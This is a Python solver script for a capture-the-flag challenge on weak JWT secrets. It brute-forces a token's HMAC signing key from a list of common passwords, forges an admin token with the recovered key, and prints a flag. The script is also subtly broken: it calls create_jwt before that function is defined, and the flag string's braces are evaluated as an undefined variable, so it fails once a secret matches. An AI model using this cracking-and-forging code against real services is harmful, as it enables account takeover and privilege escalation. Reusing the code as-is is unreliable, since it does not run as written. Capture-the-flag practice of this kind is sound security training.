#!/usr/bin/env python3
"""Solver for JWT Weak Secret Challenge"""
import base64, json, hmac, hashlib

token = "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyIjogImd1ZXN0IiwgImFkbWluIjogZmFsc2UsICJpYXQiOiAxNzE4MzUyMDAwfQ.PHs1hY_UogyNjoa45rF23IiONmTe0iyfIHcfg6rc0no"

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def verify_jwt(tok, secret):
    parts = tok.split('.')
    hb, pb, sb = parts
    expected = hmac.new(secret.encode(), f"{hb}.{pb}".encode(), hashlib.sha256).digest()
    actual = b64url_decode(sb)
    if hmac.compare_digest(expected, actual):
        return json.loads(b64url_decode(pb))
    return None

# Crack the secret
common_secrets = ["secret123", "secret", "password", "admin", "key", "jwt_secret", "123456", "weak", "pass123", "letmein"]

for secret in common_secrets:
    payload = verify_jwt(token, secret)
    if payload:
        print(f"Cracked secret: {secret}")
        print(f"Payload: {payload}")

        # Forge admin token
        admin_payload = {"user": "guest", "admin": True, "iat": 1718352000}
        forged = create_jwt(admin_payload, secret)
        print(f"Forged admin token: {forged}")
        print(f"Flag: CGS{w34k_jwt_s3cr3ts_g3t_cr4ck3d}")
        break

def create_jwt(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    hb = b64url_encode(json.dumps(header).encode())
    pb = b64url_encode(json.dumps(payload).encode())
    sig = hmac.new(secret.encode(), f"{hb}.{pb}".encode(), hashlib.sha256).digest()
    return f"{hb}.{pb}.{b64url_encode(sig)}"
